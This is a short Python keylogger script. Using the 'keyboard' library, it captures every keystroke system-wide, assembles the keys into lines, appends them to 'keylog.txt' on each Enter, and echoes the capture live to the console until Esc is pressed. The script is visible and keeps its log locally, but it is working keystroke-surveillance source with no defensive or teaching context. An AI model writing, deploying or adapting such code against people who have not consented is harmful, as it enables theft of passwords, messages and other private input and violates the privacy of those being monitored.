import keyboard

log_file = "keylog.txt"
log = ""

def on_press(key):
    global log
    try:
        key = key.name
    except AttributeError:
        key = key.char

    if key == "space":
        log += " "
    elif key == "enter":
        with open(log_file, "a") as f:
            f.write(log + "\n")
        print(log)  # Print the current log to the console
        log = ""
    elif key == "backspace":
        log = log[:-1]
    elif len(key) == 1:
        log += key
    else:
        log += f"[{key}]"

    print(log, end="\r")  # Print the log live to the console, updating the same line

def on_release(key):
    if key.name == "esc":
        with open(log_file, "a") as f:
            f.write(log + "\n")
        print("\nKeylogger stopped.")
        return False

keyboard.on_press(on_press)
keyboard.on_release(on_release)

print("Keylogger started. Press Esc to stop.")
keyboard.wait("esc")